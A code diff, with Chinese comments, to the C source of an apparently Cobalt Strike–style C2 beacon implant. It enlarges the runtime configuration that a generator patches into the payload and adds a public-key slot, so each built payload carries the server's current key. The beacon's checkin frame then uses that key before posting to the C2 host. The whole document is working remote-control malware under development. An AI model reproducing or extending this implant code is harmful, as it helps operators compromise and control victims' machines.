@@ -140,7 +140,7 @@
  * 布局必须与 go/gen_native.go 的 cfgLayout 表**逐字节对应**。
  * 改字段要同时改两处并递增 C2_CFG_VERSION, 否则生成器写进去的旧载荷会读错位。 */
 
-#define C2_CFG_VERSION 1u
+#define C2_CFG_VERSION 2u
 
 typedef struct {
     unsigned char magic[8];          /*  0   定位标记 */
@@ -157,8 +157,9 @@ typedef struct {
     char          token_hash[72];    /* 280 */
     char          id_header[48];     /* 352 */
     char          id_value[80];      /* 400 */
-    unsigned char reserved[32];      /* 480 */
-} C2_RUNTIME_CFG;                    /* 合计 512 */
+    unsigned char pubkey[276];       /* 480  CryptoAPI PUBLICKEYBLOB; 全 0 = 用编译期默认 */
+    unsigned char reserved[268];     /* 756 */
+} C2_RUNTIME_CFG;                    /* 合计 1024 */
 
 /* 模板里的初始状态: 标记就位 (供生成器定位), version=0 → 未启用。
  * 这样手工 gcc 编译出来的模板仍然完全按编译期默认值跑。
@@ -174,7 +175,8 @@ static const volatile C2_RUNTIME_CFG g_c2cfg = {
     { 0x52, 0x47, 0x43, 0x32, 0xA5, 0x5A, 0xC3, 0x3C },
     0u, 0u, 0u, 0u, 0u, 0u,
     "", "", "", "", "", "", "",
-    { 0 }
+    { 0 },   /* pubkey[276] 全 0 = 未写入, 回退编译期 CSDEV_PUBKEY_BLOB */
+    { 0 }    /* reserved[268] */
 };
 
 /* ---------------------------------------------------------------------------
@@ -219,6 +221,26 @@ static int c2cfg_ok(void)
 {
     const C2_RUNTIME_CFG *c = c2cfg();
     return c->version == C2_CFG_VERSION && c->host[0] != '\0';
+}
+
+/* 运行期公钥: 生成器把服务端**当前**公钥写进槽位 pubkey 字段, 保证载荷与服务端
+ * 私钥永远同源; 若槽位未写入 (全 0, 例如手工 gcc 编译), 退回编译期 CSDEV_PUBKEY_BLOB。 */
+static const unsigned char *c2cfg_pubkey(unsigned int *len)
+{
+    const C2_RUNTIME_CFG *c = c2cfg();
+    unsigned int i, nonzero = 0;
+
+    if (c2cfg_ok()) {
+        for (i = 0; i < sizeof(c->pubkey); i++) {
+            if (c->pubkey[i]) { nonzero = 1; break; }
+        }
+        if (nonzero) {
+            if (len) *len = (unsigned int)sizeof(c->pubkey);
+            return c->pubkey;
+        }
+    }
+    if (len) *len = CSDEV_PUBKEY_LEN;
+    return CSDEV_PUBKEY_BLOB;
 }
 
 /* ---- 取值访问器 (运行时有值就用, 否则退回编译期默认) ---- */
@@ -2844,9 +2866,13 @@ int beacon_run(void)
     }
 
     /* ---- checkin ---- */
-    flen = cs_frame_checkin(g_tx, MAX_FRAME, CSDEV_PUBKEY_BLOB, CSDEV_PUBKEY_LEN,
-                            g_sess_state.aes_key, g_sess_state.hmac_key,
-                            g_meta, bstrlen(g_meta));
+    {
+        unsigned int pklen = 0;
+        const unsigned char *pk = c2cfg_pubkey(&pklen);
+        flen = cs_frame_checkin(g_tx, MAX_FRAME, pk, pklen,
+                                g_sess_state.aes_key, g_sess_state.hmac_key,
+                                g_meta, bstrlen(g_meta));
+    }
     if (!flen) return 4;
 
     rlen = c2_post(g_tx, flen, g_rx, MAX_FRAME);
